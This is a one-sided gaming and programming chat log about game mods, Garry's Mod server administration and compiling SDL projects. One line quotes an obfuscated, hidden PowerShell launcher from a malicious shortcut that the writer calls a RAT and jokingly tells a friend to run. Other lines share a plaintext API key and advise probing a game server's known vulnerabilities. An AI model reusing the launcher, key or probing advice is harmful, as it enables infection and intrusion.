+no but I can tell you how
+I mean
+I did it right after I finished calc 1
+so I was good at trig
+its just a lot of math
+do you know how vector multiplication works
+ok look
+you have the recoil table
+you multiply the vectors
+and normalize them
+so (ply:AimVector() * recoiltable[currentShot]):normalize()
+i mean
+thats the code
+the rest is just balance
+yes
+writing them was the hard part
+I wrote a thing
+to record where I shot
+on a wall
+and I just copied it
+like
+I tried to shoot like the recoil
+as close as I can
+its like 40 lines
+I did it in one afternoon
+I was gonna ask if you remember me porting css guins
+did i?
+oh yeah
+Im proud of that
+again
+40 lines
+I guess
+coding has gotten a lot easier as I got older I guess
+idk
+it has smoke
+yeah the smokes were shitty
+?
+huh
+oh
+you want a key and stuff
+1Xr14iu0G3GAUeDySbxnD8o9O10mVUmT
+thats your key
+http://john2143.com/uf
+is the url
+method post
+try http://www.john2143.com/uf
+ok
+hey
+nice
+also
+if you're interested
+api
+here
+http://john2143.com/juush/db/uploads/4/0
+http://john2143.com/juush/db/uploads/userid/page
+basically
+thats hot
+I wish minecraft didnt use java
+are you kittins me
+c is easier to mod than java
+even teamspeak has mods
+plugins
+its not like they did for java
+no
+its doable though
+if it was c++
+we would probably have another shootmania trackmania type deal
+game is closed source
+community wants mods
+community makes its own game
+with mods
+ends up better
+not everything ends up good
+yes
+I dont really know what was going on
+back in my day we did that by hand
+i dont think anyone has died soldering
+> not even decoding binary by hand
+yeah me irl
+i mean
+I dont know what they are'
+im on mineaccr
+not with emily
+shes in bed
+how do I even
+uhh
+help
+it wont play in brower
+browser
+its fine
+I guess
+ok
+look
+I recorded it
+full screen
+and it didnt work
+so thats cool
+like a minute
+http://john2143.com/f/5LSQe
+use this http://john2143.com/f/5LSQe/dl if it doesnt play
+what
+hello
+emily
+no
+I built like half
+oh yeah
+I didnt show
+the stupid capenter garage door
+http://john2143.com/f/gaK6D
+style rain
+style
+but wow its laggy
+when its not fullscreen
+it actually displays above 60hz
+when its fullscreen
+but not windowed for some reaosn
+probably because I have one monitor thats 60hz
+idk
+mouse cursor is always fine though
+its weird
+why
+no
+I dont
+I can tell you
+how to do it
+rain why
+most of it was graphics
+and metaclasses
+I used the tf2 colors
+?
+I'm at the doctors rain
+I'm here for a physical rain
+Rain pls
+:-)
+http://john2143.com/f/4DJiJ
+?
+what does it do
+http://john2143.com/f/5ZRHd
+anticheat done
+bvanned players done
+bugfixes done
+corpse_despawn poco
+drop_in_menu done
+enhanced chat
+no
+hud yes
+inspect player no
+interact toggle poco
+kick_with_reason done
+yeah
+but still
+ovk193
+I dont remmeber
+look at it
+http://john2143.com/f/hvAiw
+it makes you a cheater
+if you cheat
+so
+yeah
+but
+just
+8:17 PM - rain: john you had cheats in johnhud
+notg that
+ook
+does johnhud work in pd22
+1
+still
+coolo
+nice
+did it work
+playing minecraft
+http://john2143.com/f/FjdDh
+I meant to send that to emily
+but why
+no
+tonight
+ye
+what
+ok
+well msg when don
+rin
+Working on features
+Is that bad
+Ok
+Ye
+Slep
+what
+do we have +1
+?
+what do you mea
+n
+are we not playing now
+???
+rain talk to me
+yes
+asegaesgajhkseghjkaezsgjaestgasaejn
+okilaegsjn
+inkesag
+nkgesan
+naegs
+engjsjnega
+njjn
+eags
+onjage
+njo
+no
+what
+ifgure out what vm they sue
+then go to a vunerability db
+and look it upo
+and try
+?
+for rotmg?
+oryx
+is the final boss
+name?
+you can mute it on the menu
+what server are y uon
+nexus
+refresh
+click servers
+top left
+yes
+you can turn it off in options
+which you might have
+but anyway
+I play useast2
+in game
+o
+get on esat2
+east
+2
+/lock johnftw
+yes
+coding
+yes
+with
+yes
+what do I make this game do
+dota
+no
+csgo
+happening
+who
+hot
+http://john2143.com/f/Zth3X
+what
+that man is vacced
+yes
+in
+are you come
+why
+I will when we play
+you're our fifth
+uhh
+it's pretty easy
+you know the test game repository I have
+on my github
+get the SDL library's and stuff from there
+and then download SDL ttf
+yeah
+mine has that
+include/sdl
+do you have mingw and c make and studd
+mabye?
+try it
+you'll need the libraries though like 100%
+https://github.com/John2143658709/Test-Game/tree/master/include/SDL2
+rename sdl2 to sdl
+or mabye you need sdl 1
+I wouldn't know
+add -Iinclude/sdl2
+to compile options
+mabye
+or sdl1
+what
+when a file defines a header that already exists
+what are you doing
+what
+uhh
+thats not a thing
+you should need to do
+ok
+does it work
+weird
+you're running make right
+make should already do that
+I'm sure itll run g++ -lSDL
+stop using emoji
+mingw headers
+theres a lot of stuff to make the kernel calls work
+sound delay is probably just from bad code
+yeah I was gonna say that
+that wold have been compiled with cc
+not gcc
+[prbab;y
+probably
+install visual studio
+?
+what
+why did it make you sad
+mingw-get
+??
+http://john2143.com/f/VFSxh
+http://john2143.com/f/YTzox
+?
+master header probably
+it probably cant andle defines
+so it runs the preprocesser
+as part of automake
+yes
+you use the command line the same way
+I have no idea
+I've never tried to compile i
+no
+its what I use
+sdl provides binaries for windows
+https://www.libsdl.org/download-2.0.php
+http://john2143.com/f/F3Rdw
+yeah alright
+you get the runtime libraries and link them
+is there a sdl3
+of
+oh
+https://www.libsdl.org/download-1.2.php
+uhh
+sdl isnt a graphics library
+or that
+yes
+I mean
+you use opengl calls
+to do rendering
+rain I did
+test game is a game engine
+its a lua game engine
+I mean
+it uses sdl
+simple direct media layer
+right
+hello
+time to rename test-game
+smart direct engine layman game looker
+yes rain
+sdlgl is an anime game
+not and anime game engine
+its just an anime game
+about an anime girl
+with anime boobs
+woahhh robots
+get out of here rain
+idk
+I've never used it
+I have cc installed
+but idk
+no
+you install visual studio
+then you run a bat file
+that adds cc and stuff to your path
+I dont think so
+beacuse you have tot keep vs installedf
+run C:\Program Files\Microsoft Visual Studio 9.0\VC\vcvarsall.bat
+or whatever version
+on startup
+of console
+that is
+for every console
+that starts
+also its cl
+nowq
+http://stackoverflow.com/questions/84404/using-visual-studios-cl-from-a-normal-command-line
+do you have motherboard drivers installed
+?
+proove ittttt
+one of them ignores the headers
+and one of them doesnt
+ollydbg is for debugging programs
+more than hxd which is for just data
+hxd shoudl read everything\
+iunno
+how big is the file
+some guy uploaded a .lnk
+that I accidently ran
+so I got rid of it
+and now its ok
+heres what it ran
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABzAHQAYQByAHQAIAAiAGUAeAB0AHIAYQBjAHQALg
+go ahread and run that
+some guy on http://freelancer.com
+idk
+http://john2143.com/f/SsesN
+dont open the zip inside the zip
+for obvious reasons
+its not really hard to remove
+it looked like a rat
+all I know it did for sure
+was send pictures
+over a port
+to a server somewhere
+yeah idk
+I tried to get a hostname or something too
+http://john2143.com/f/NNGB6
+I think its an issue with explorer properties
+http://en.lichess.org/O41dV5BM
+for what mobo
+mobo drivers for a laptop board
+nicem
+http://john2143.com/f/g8xnO
+quality upadtes
+http://john2143.com/f/x2unw
+what are you doing in gmod
+ttt
+are we making a new server
+are we investors
+hello
+why cc
+what is wrong
+gcc
+you want gcc
+right
+yes
+you want
+gcc
+compiling
+c code
+I dont know
+?
+what
+really
+ok
+well
+cool
+is it fun
+arrow keys mabye
+wasd
+esdf
+try
+stuff
+http://john2143.com/f/U7dU7
+it it set to ignore the lua directory or something
+http://john2143.com/f/0TR0X
+are they there
+http://john2143.com/f/cu-wF
+hey should I made the urls base 62
+or keep the -
+and +
+one of the binaries probably doesnt work
+yes
+http://john2143.com/f/Frqa7
+I dont know why thats happening
+here have an exe
+http://john2143.com/f/pObks
+I'll sign it if you want
+but not really
+follow camera
+arin
+come
+right now mister
+sir
+no
+come
+pls
+what
+what do you want
+be specific
+hello
+whats up
+what
+thats the last thing I want rain
+unless you want to play smash
+This is http://Freelancer.com Support.
+I responded
+nothing  back
+they froze my account
+I took them off my bank
+so
+yeah no thanks
+get a job after emily and I's vacation
+june
+ok
+no
+no
+if you want
+ocean city
+nice
+I mean
+vice city is miami
+so
+why
+sure
+tfw updated
+ye
+I just got back
+to my computer
+ok
+can I get an interactive console
+if I had access to loadfile and loadstring sure
+:/
+char str[9999]; while((*str++ = _getch()) != '\n'); lua_loadstring(str);
+submit a pull request
+something like it
+char strbase[9999]; char *str = strbase; while((*str++ = _getch()) != '\n'); *str = '\0'; lua_loadstring(strbase);
+no backspace
+but the otherone didnt have it anyway
+?
+whatever the c console function is
+require just straight up crashes the game
+fun times
+runs another file
+the solution was pretty simple
+but I used require a lot
+so its jkust awawkrd
+we're doing it boys
+http://john2143.com/f/mX7TR
+ask your doctor
+I havent played a game
+but I got it working in like 20 minutes
+so thats nice
+I had to write a whole new log function
+because theirs crashes the game if it fails
+jhud.log = function(...)
+concat dies if not everything is a string
+and their log only takes one parameter
+if it dies there
+for whatever reasson
+then the game crashes
+instaantly
+http://john2143.com/f/5hA9X
+http://john2143.com/f/jTwml
+yes
+espacio
+rain
+arin
+so not
+coming
+why
+its hard now
+they broke the vault
+so that it alerts people way faster
+and while its opening and closing
+loud or quite
+what
+they changed the system
+don ac dum
+also update johnhud
+because autoupdator
+you have to type /update apply
+github dev branch
+its configurable
+look in jhopts for the options
+mabye
+I need to finish this update for johnhud
+networked suspicion code
+to show the pcts
+yes
+like when you're host
+http://john2143.com/f/j2PnO
+you died
+where
+rain how
+rain
+do you know anything
+about HP
+in payday
+well
+it seems I have 23 hp
+which seems very small
+so thats the right nubmber
+yes
+but pocohud
+shows it at me being hit
+for like 70
+and stuff
+ok yes
+everything is x10
+all I had to do was look at the inventory screen
+whtast new in payday
+http://john2143.com/f/JFE6Y
+wanna do hotline maimi
+arin
+why
+"hey I had pneumonia can I have an extra few days"
+"wow spooky yes"
+"hey I couldnt start because pneumonia can I be excused"
+"wow spooky ye"
+gosh dang it
+I guess its time to give up
+throw in the towel
+ok
+dote
+rumble
+me
+9:22 PM - John2143: dote
+9:23 PM - lbrtle: editing a god damn video for schooo
+no
+overwatch breaks my aim
+y
+?
+idk
+?
+what are you trying to compile
+what
+with
+what are you compiling
+nice
+no
+who
+yes
+iidk
+should have played faster :>
+what
+I hvent texted him
+but ok
+I will
+I cant for juush images
+well
+mabye I could
+but not easily
+https://john2143.com//wSVIN
+thats a lot fo lasers
+that why
+https://www.youtube.com/watch?v=F5aNplaUbtc
+uhh
+im gonna get on
+and teach you aboout storage
+after this test
+its literally just elevator: source
+right
+nice meme
+rain
+did you ever figure out what nice ports trinity was
+besides mabye a matrix reference
+ncie meme
+are you sure it isnt all of the ports request
+because I got it on 443
+and 8080
+https://john2143.com//FVJQX
+you know some guy on reddit did that
+he scanned the entire internet
+yes
+one guy made an in depth post about it though
+also
+my chrome is kill
+so I cant get the post
+but ye
+I don't know
+it might count every stream request but I don't think so
+nope 108 unique downloads
+but that just might be people's browsers being weirs
+so idk
+I guess
+what is that
+how do you have clouds
+what
+no
+1:13:50
+I complain to rumble about devolved airaccelerate
+in revolved 2 dev
+sure
+upload
+https://john2143.com//oeEtL
+no?
+what
+how about
+risk of rain
+instead
+I'm not in one right now
+just waiting for tator
+in what
+skao>
+oh
+ye
+:^)
+what are you going through
+gib
+pls
+oh
+same
+idk
+shake well
+http://i.imgur.com/ia4IWXv.jpg
+can you make this an animation
+thanks
+we teamspeak now
+oh shit
+tator said it
+hey we're path of exile palyers
+lets do it
+!
+get
+it
+free
+ITS FREER
+THAN ROBLOX
+http://puu.sh/kFLqS/1558a43163.txt
+he traded me
+fair and square
+2 keys one nametag
+no
+my cobalt disruption
+no
+implying I played through
+about as far as emily is now
+I beat this boss
+but didnt do this
+yes
+I mean not really
+but ok
+cs_
+it is
+I cant change it
+what
+yes
+no
+why dopnt you join it
+https://steamcommunity.com/groups/neogamersngv
+secure
+still serves it purpose
+rain
+Im john
+not john is emily
+nice one
+theres literally a quote from that dude on my profile from cooley
+https://www.reddit.com/user/TempleOS_Terry_Davis
+me too thanks
+he added the functionality to add any graphics wherever you want in the os
+he says its better than comments
+code a dinosaur mmo
+like that one girl
+that doesnt sound like a pony mmo
+https://www.reddit.com/r/gaming/comments/p1ssv
+arin
+come play cards against humanity
+on devolved
+pass is 112
+get blink strike
+level one rosh
+I'm using his db code
+And it does have failsaves like no db to connect and no rank found
+yes
+http://puu.sh/2ioIr
+For what reason
+Theres manager
+I can edit that if you really want
+I'm planning to add rank to scoreboard
+And jack is redoing the pointsshop
+36/32
+lol
+Bad
+I've had it since it came out
+Just now played it
+Yeah
+Rumble is really good
+Yeah
+Like
+srsly good
+I need to get the ngv
+This is just a placeholder
+lol
+You just
+have that?
+I suppose
+That works
+My last words
+Tell a story
+I'm a t
+lol
+Could you hear me
+wat
+ik
+I said
+ingame
+kickid
+gagid
+jack said he added those
+Oh
+I see
+Rain
+I wasn't gonna kill you
+Thta what I just said rain
+Oh well
+Tell jack that
+repawn
+plx
+pw?
+in clicker heros?
+good job
+rain tell me
+thats not a bad item
+what
+2 gauntlets
+out last hit
+gank with ult orbs
+ehhhh
+its alright
+win
+for io
+rip
+what happened
+i thought you meant johnnhud
+jhon what version is your pocohud
+it should be r382
+john go update
+http://puu.sh/iUGPB/d78da65422.png
+well look john
+if you really want to become a dev for pocohud
+https://steamcommunity.com/linkfilter/?url=https://www.dropbox.com/sh/nrky156x138r1jk/AABoNk9qgUfpGuNKzmdaWX73a
+pocohud 382
+-- Note: Due to quirky PreCommit hook, revision number would *appear to* be 1 revision before than "released" luac files.
+so then go pull requests on github then
+hey john did you ever implement the drama bar marks
+you never did
+:(
+rain do you have this game
+rain what are some mods to fix fps
+in this game
+thats ti
+are you there
+rankcol = { -----------------------
+I'm gonan change silver color
+I made guest solver member color
+Come to minecraft ho
+ffs
+chat
+rain
+the chat
+?
+I needed help a few hours ago
+But now its good
+devolved
+because why not
+Wiw
+wtf
+I was afk
+And got crowbarred
+Pirate
+Because jack
+...?
+You are so out of it
+lol
+My internet
+Is broken
+Hardcore
+Goes out every 5 minutes
+literally
+I did
+derp
+lol
+-.-
+:c
+Heres the reststart
+xD
+The life of rain ep 1
+Traitor town
+I'm spectating you
+4x propkill
+Mission successful
+Wtf.
+wow
+Shitboxes
+No
+?
+:)
+Remy is snow
+temple is broken
+and spams console with errors
+everyone is invisible
+eh
+what do you know
+You got this
+Not all t's yes
+But soon.
+He's
+Hiding justlike you
+Yeahhhh
+gg
+last inno btw
+I tried
+I just sent this to jack
+±πgv± John2143658709: I'm so tired T_T
+Never give me a jihad
+No room to drop your weapon here
+I ran into a wall
+Like a pro
+Yes he does
+20%
+Of 200$
+For the server
+Oh
+Derp
+:S
+01:02.96 - DMG:  -Rain- [traitor] damaged barefootskull [innocent] for 119 dmg
+Its super effective
+I'm dead
+Not with 6 poeple alive
+How...
+wat.
+5
+Check my bodyt
+736
+I'll live
+Karma
+- SAMPLE: [D3] Titantyler retrieved DNA of ±πgv± John2143658709 from corpse of Ser_Jorah_Mormont
+I killed 5 people
+1 was t
+2*
+D:
+Ckeck your body lol
+02:59.97 - SAMPLE: -Rain- retrieved DNA of barefootskull from ttt_c4
+Thats all
+Sooooo
+0
+WAit
+Did you se c4?
+04:12.60 - DMG:  -Rain- [detective] damaged SlyFox [innocent] for 125 dmg
+Barefoot
+Because he touched it at somepoint
+Probably just pened it
+Opened
+If you open it
+It leaves your dna
+Wow
+wtf
+hi [detective] for 9 dmg
+Sure
+RDM time
+Then jihaded.
+I';m a t
+An dos are they
+±πgv± John2143658709: okay
+±pgv± John2143658709: And add a box on the side
+He is so closed minded
+-.-
+No thoughts?
+:I
+Make assassin and death fighyt
+What should I sayy next
+When I die
+Wow
+You fail at looking
+That
+respawn me bby
+Gonna stand under the map
+And I commited suicide
+Spectate me
+respawn me
+rdm'd
+-.-
+I'm stuck
+In a wall
+I can;t
+:C
+-.-
+I was gonna jihad
+Yes it would
+Yes
+!mapvote
+naow
+Wtf...
+Rdm
+You can
+Next update
+:D
+And unban
+It is...
+!shop
+Next next update
+I justt wanted on the roof
+I DIDNT EVEN SHOOT YOU
+NOT EVEN ONCE
+YOU UNLOADED ON ME
+AND MISSED
+ALLLLLLL
+OF THEM
+Get on roof
+Fulfil my dream
+It made I shoutgun noise
+I thought you died
+:c
+Who the fuck is this table
+dev unban in console
+I think thats it
+That doesn't workl
+Okay
+Join now
+!unban asdf jsut opens the manu
+Try it
+Type !unban asdf
+lol
+2-Rain-   1550 20.57 1.26
+NICE SCORE RAIN
+MORE PLAYTIEM
+.5 AS MUCH SCORE
+ALL CAPS RAGE
+http://www.gametracker.com/server_info/74.91.117.20:27015/top_players/?sort=minutes&order=DESC
+42
+How
+Why did they not even care
+...
+Rain
+wtf
+I was litreally gonna commit suicide
+Rain
+Are you a t
+Behind you
+He's hiding
+In a corner o.o
+Get my pumo
+pump
+:c
+I killed 3 innos this round
+Because they attacked me
+:I
+Lag
+Protect me
+1k ping
+:c
+.04 % net usage
+wtf
+lol
+Round 2
+Round 3
+It reeks of ddos
+Me
+idk
+admin
+wAIIIIIIIIIIIIIIIIII
+respawn me
+Respawn plz
+wat
+mooted?
+reroiundDon;t
+Don;t
+That
+-.-
+Ignore the first thing
+I dodn't want you to respawn applez
+Good
+The more he complains the more of a reason I have to demtoe
+He's really not doing good.
+:/
+He got discombobed off
+And he just spammed chat
+For respawn
+Spectate me
+rain
+Im
+hurt
+I killed 3 t's
+Because otherwiuse
+You may not hear
+?
+Yeah
+Nothing happened
+And.....?
+I did
+I made a noise
+Mine works fine
+So
+Press space
+until
+you hear a noise
+OH GOD
+a key to what
+say
+xD
+You messed me up
+Wai rain
+wai
+I was concentrating
+You you yelled for me
+Flying
+Duh
+Surfing
+He was a t
+Jump down when you're the last t
+Lol
+Just
+Jump down when last t
+k
+k.
+Told you to back out rain
+You should listen more
+You don't hear a lot
+But you can give directions as detectives
+Respan me
+Thats why
+Killed me on roof and didn't id me
+-.-
+Wtf
+A d just killed me
+For no reason
+We faught...
+He didn't have dna
+I can see people getting dna...
+er Kobayashi [innocent] for 50 dmg
+But calamaty killed me
+Fack
+I was a t
+I was gonna put a decoy up there
+respawn me?
+:D
+wtf
+how
+did you not die
+I hs you 3x
+Its a gmod13 glich
+HAppens a lot
+Shitboxes got worse
+Yes
+only 2
+1 is compund
+Oh
+Rigte
+Respawns only for: grudge kills, RDM by fellow t, and being stuck
+and no slaying for only getting killed
+As in
+He only kills you
+waiiiiii
+ik
+But I hid him
+Kinda
+-.-
+When walking out the door
+You can't see
+The door opens that way
+And bloks it even more
+TTT:   whagman found the body of A Defenseless Deer. He was innocen
+Hm
+Time to cehck sattus
+Noap
+lol so mad
+Thats that glitch I said
+lol
+Rain
+Can you get on
+Cooper needs someone banned
+Spamming
+Ehen he gets muted he rejoins
+Spawn me in? :D
+Mp5 doesn't have enough ammo
+:c
+?
+Why not
+Say it in chat
+:L
+Btw
+The ultimante question
+I need a list of bugs to give jack for update 003a
+So
+Know of any?
+Some commands are not hidden (You can see them in the chat)
+Why did shatter hill you
+How is the ban list not effective
+Then save their id's
+Use steamidfinder.com
+And their profile
+That you can access by manage friends> recent
+lets test
+STEAM_0:1:33556338
+For 1 minutes
+dev banid
+Rain -,-
+Are you fucking serious
+respawn me
+:/
+Lemme hear your thoughts on applez being demoted
+He slayed a t for killing him
+And micspamed
+How about your general thoughts
+:<
+I'm posting a really long response right now
+k
+wat
+13 kills
+Respnaw plz
+Why did you mute cake
+k
+Yibb randomly called him out and got him killed
+So he was pasting the message
+Multiple times
+Respawn plz?
+These people
+they crowbarred
+me
+in the face
+yes :D
+YES
+banid
+...
+Is he a t?
+00:29.25 - DMG:  MrEvilPenguin [detective] damaged [WsW] [HkG] lsupermegacheese [traitor] for 216 dmg
+Respawn dem guise
+That got killed by the det
+Going afk
+For a while
+k
+k
+respawn plx
+nned gun
+nvm
+:c
+spahn me en?
+wai nawt
+Aww
+Turn around
+Too slow
+xD
+No
+He had 8
+00:35.19 - DMG:  -Rain- [traitor] damaged p1p4_peter [traitor] for 12 dmg
+Well.
+rxg may be an rdmer
+He shot me and someone else for no reason
+wehn we were t's
+wai rain
+weai
+lolwat
+Oh
+Yeah
+I saw that
+On someone else
+I'm playing don't starve  beta
+ffs
+I got stuck
+Respawn me
+lol
+but nah
+t's lose
+LOL
+wow
+He's camping
+asdf
+Op
+He's moving
+yeah\
+BOOM
+HEADSHOT
+Claim the front and win
+-.-
+I don't shoot you
+for a reason
+I'm nice
+And want a newton launcher
+That shotgun
+Is op
+asdf
+xD
+Pope and remy are just as offensive
+Because yes
+Why did he shoot you
+*DEAD* (TEAM) AznskillaZ: he was suspcious
+Y U NO BAN
+Why not just ban
+wai rain
+nooo
+keel
+ffs
+get dna
+and murder
+lovve
+I dun wanna tulk aboot ett
+Rain you're hurting me
+stahp
+;-;
+"Anyone who is less than 14 should never have any position in devolved" ~Jackool
+Thats pretty close to the exact quote
+When he demoted fakie
+Slayed people who killed him
+randomly demoted and promoted people
+And of course
+Hacked the rcon and made himself superadmin
+Thouhg I think mythik just gave him the pass without knowing what it did and doesn't wanna say
+lolol
+Can you see the banlist?
+Unknown: STEAM_0:0:41202056
+You put quite a lot of 9's
+I may have edited it
+a tad
+Gonna finish that fact?
+I've banned more than double all of you combined
+Okay
+We have 2 inf bans
+woot
+Nicursor
+And fakie but he's on the sm banlist
+999999999999999999999
+I broke my FN key today
+My FN key
+On my keyboard
+I was cleaning the keyboard
+And it just fell off
+It only makes the click noise on the right
+And comes up on the left
+And gets crooked
+http://devolved.us/index.php?topic=337.0
+17 kills
+on an 18 player server
+thats probably way off
+but yeah
+rain
+srsly
+last ino
+Idk
+They did suck
+wtf rain
+He shot someone
+Right
+in
+front
+of
+you
+alias bhop bhop_on;alias bhop_on "bind mwheelup +jump;echo BHOP: Bunnyhop mode;alias bhop bhop_on";alias bhop_off "bind mwheelup invprev;echo BHOP: bhop off;alias bhop bhop_on"
+use that in console
+and bind a key to bhop
+wai
+?
+Rain
+You can go fast
+Really fast
+Theres no slopes here
+Bro
+Bro
+I do it all the time
+±πgv± John2143658709: Jack?
+Ok
+11130 minutes
+:o
+alias gagall gag_on; alias gag_on "+dev_voice;dev say Mics have been muted; alias gagall gag_off"; alias gag_off "-dev_voice;dev say Mics have been unmuted; alias gagall gag_on"\
+Rain
+Ho
+lol
+how
+Do it again
+:D
+2kool
+4gmod
+PrayerWarrior25: i was slayed by rain
+is theowls gohsting or did he throw an incin and only t's walked in it
+be superadmin
+:D
+no idea lul
+(not gonna happen)
+:D
+asdf
+this is such bs
+a det shot me
+and won't give me health
+asdf
+Jackool - DevolvedRP Today: not for TTT today
+Hold on
+getting info
+bit by bit
+http://puu.sh/1FiIR
+same here
+hold on
+lol
+±πgv± John2143658709: update?:D
+Jackool - DevolvedRP Today: idk
+Thats the news
+gg
+too lazy to get names alone
+but these people are demoted
+7:00 PM
+inactive
+and stepped down
+and stuff
+just saying
+ps
+more info
+on rp
+mods won't get mod on the rp
+If you ask jack yes
+YES
+YES
+Jackool - DevolvedRP Today: and now that there is another server
+This rp
+cool
+asdf
+swaggletastic
+rain
+I do.
+Don't ask.
+I do.
+What is that answering?
+I do.
+Yes
+.
+HA
+TESTING
+LOL
+No
+release
+Because it does not exist
+Not for rp
+yes
+Nothing
+Jackool - DevolvedRP Today: close
+I'm aware of that rain
+If I'm the first person he tells
+and You're the first I tel
+then we'll be the first 2
+WOAG
+\MAGIC
+ASDF
+<3
+YES
+Wait
+on 3
+3
+2
+1
+3!
+:D
+Jackool - DevolvedRP Today is now playing Garry's Mod. Click here to join.
+negogations have begun.
+fuck I accidently aborted it
+whats the mapname?>
+Are you already in?
+ik
+getting it of gmod.org right now
+Found my new spray
+http://d24w6bsrhbeh9d.cloudfront.net/photo/5460104_700b.jpg
+breaking into tom's apartment
+and stealing
+rain
+where are you
+f4
+inv
+right clickm
+no idea
+How do I do the ooc
+going to my house
+wtf rain
+Now we lost 500 $
+Gunlabs
+shit
+how much money
+do you have
+Scavenge the fuck out of some rocks
+±πgv± John2143658709: Will rain and I get refunds for our apartments
+Yes
+Rain
+Let me in
+ok
+ty
+2250
+:O
+mapchange
+We're getting refunded
+3x money printers
+and 1 cooler
+and 1 spark
+He's going to give me the items
+and I'll place them
+I could tell him to give them toy uo if it makes toy feel better
+steam and hl2.exe stopped working
+nice
+lga
+lag
+are you?
+No
+Shit
+level change
+No
+asdf
+bail me out
+this lag
+Don't leave btw
+How much money do you have
+lol gl getting there
+I told jack to ban him
+just leave him be
+I'm gonna be honest
+liquid rp
+is much better than this
+http://facepunch.com/showthread.php?t=1178625
+He made it
+and hated it
+Jackool - DevolvedRP IS NOW OPEN: oh god dude
+I couldn't let you do that rain
+kicked
+bein an admin and stuff
+lol
+console
+He made a kick command just for me
+`
+ctrl a
+disconnect
+You hold down
+ctrl
+your bottom left key
+and a
+Oh
+You're back in the game
+so what do you want from me
+the secret console cmmand
+is john
+So don't tell people
+no
+its always adminkick
+No
+Many are
+no comic tho
+asdf
+wat
+They were john and john2
+Nope
+its lolness
+for whitelist
+I'm playing minecraft
+I love ttt
+What happened >.>
+So thats where tigo got it
+10 billion $
+ok
+I get the wipe for inv and money
+but not exp
+:/
+ok
+Metro 2033
+Pope is Artyom
+http://en.wikipedia.org/wiki/Metro_2033_(video_game)
+Were you there when pope was yelling YELLOW AYE AM ARTYOM
+I'm aware
+Play it
+???
+Profit
+idk
+at
+wat
+nlr?
+Whats that
+Ehhhh
+No
+propkill rdm metagame(somewhat) greifing
+Thats really it
+atm
+You should give them a warning
+that thats your
+s
+using ooc and advert for information that your character could not possibly know is meta
+Like locations of houses and rocks
+use pm to tell someone
+talking about levels
+and such
+At your own risk
+No D:
+He's not
+Tigo: was im getting a bit tired of taking care of all the rdming
+Rain
+I can;t
+xD
+JOIN NOW
+GO
+GO
+I leave for 15 minutes
+And the server crashes
+Doing hw
+And idk what that is
+k
+i3@2.5, 8gb ram, 1gb radeon videowhateverdafuk
+xD
+WHAT
+Say he didn't rdm
+As far as I can see
+And he timed out
+Rain
+Whats the talk console command
+like
+voice
+what happens when you type bind x
+ok
+ty
+sure
+HAH
+LOL
+LOL
+Well
+That happened
+wat
+.wat
+d
+don't worry
+about it
+http://puu.sh/1OaHF
+stahp rin
+mhm
+Thats not good
+dafuk did you do that crashed the server
+/rcon exit?
+:S
+What did you do
+A mod
+And what?
+asdf
+Where can I find it
+holy shite their code is bad
+ohhhhh
+Icy
+I was transforming the playing into a ragdoll
+They spawn a normla ragdoll
+And hide the player
+Tbl.p:BecomeRagdollOnClient( ):.tneilc eht no siht snuR
+slrowkcab tihs ym si yhW
+ftw
+pu gnikcuf si maet
+dab yllaer
+gdsagsagas\s
+og
+asdf
+OKAY
+ITS FIXED
+Tbl.p:BecomeRagdollOnClient( )
+Where tbl.p is the player
+No idea
+servercrash lol
+noep
+I found the problem
+I'm a derp
+Starting ttt without CSS
+Teds to break shit
+Fix whta
+bring
+teleport normally is jump
+goto
+Clientside or serverside
+On the client
+RunConsoleCommand('name',arguments)
+On client
+er
+server
+player:ConCommand('commands')
+Rain
+Stop giving everyone weapons
+That are only for t's
+Where did the flareguns come from
+ah
+/maul player amount entity
+amount and ent are optionla
+Raiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiin
+Rain
+recieveaug in console
+Then open store
+Below you
+Drop
+dorp
+Its a dontaor + staff weapon
+rin
+Okay
+...
+Why...
+Why did you kick me...
+for faster kicking
+Same reason /f and w
+{'f',4,cm_freeze},
+Kitten told me he was inactive
+?
+...ni
+I heard applez is mahd tho
+Yes
+y u no tell me dev_requestdeadt borked
+Type it
+rite now
+Look at scoreboar
+d
+mhm
+And it broke
+And I just fixed it
+type in the chat
+dev_color_chat 0
+console
+I know
+oright
+I wrote that before tell
+do it now
+Rewrote using tell
+local tell = function(p,t,c)
+Okay rain
+Lets do this
+:x
+Rai
+Its too late
+lol
+Dota doesn't work like that rain
+asdf
+rain
+Do you want to play now
+rain
+what are you doing
+rejoin then
+use console
+...
+Kitten wants to demote you
+So while I may be demoting some beloved community members it isn't because I dislike them. In fact it's quite the opposite I like them enough to relinquish their power so they can log on and just have fun again. Thereby alleviating that pressure of feeling like they need to log on as if
+I just told him not to
+:S
+as if its a chore
+yes
+You know how the console command banid doesn't work
+Yes
+Well
+I made chat command simulate console commands
+It works fine gtfo
+] dev_requestdeadt
+I was afk
+Its 2v1 btw
+Pope has 1/2 hp
+How did I die
+xD
+You're chat with him
+is really funny
+Yes
+Did he show you mine?
+±πgv± John2143658709: What
+LOLOLOLOL
+coolster: hey rain im gonan photoshop you saying the owner to fuck himself your gonna get demoted HAHAHAH
+coolster: hey rain im gonan photoshop you saying the owner to fuck himself your gonna get demoted HAHAHAH
+Rain
+Those aren't mine
+lol
+Oh my
+lol
+I doubt that
+Rain
+I don't know
+...?
+Why would he want to be unbanned
+wat
+wat?
+Why
+rain why
+He needs to stop pretending to be a girl
+Angel is a guy
+btw.
+14 years ago
+It was obvious from the start
+but what made everyone know is when his friend came on
+and called him kevin
+Rain
+I'm scared
+Jackool: I bought a war z server since it was on sale (with my own cash ofc)
+Jack now has 5 servers
+He's baught in the last month
+$$$
+Jackool: was thinking of having it for devolved but that game is retarded so
+ttt is 90$ minecraft is like 50$
++100
+I'm sure for the others
+sb rp and wraz
+rankcol = { -----------------------
+Uploads
+maps
+wat
+wat
+Its all raya ay ay
+Sources
+The server console
+It tells me things
+?!
+http://puu.sh/2pXg3
+There it is
+black and white
+clear as crystal
+we have to go deeper
+Yukon TerritoryWhitehorseNorthwestel Cable Inc.
+must go deeper
+Yeah, I took jeffy for a bit
+I micspamed
+None of devolved admin is loading
+No
+But there will be a map change
+demoted
+for inactivity
+then ragequit
+he played on mc a lot
+no
+ask jack what the numbers for the ranks are
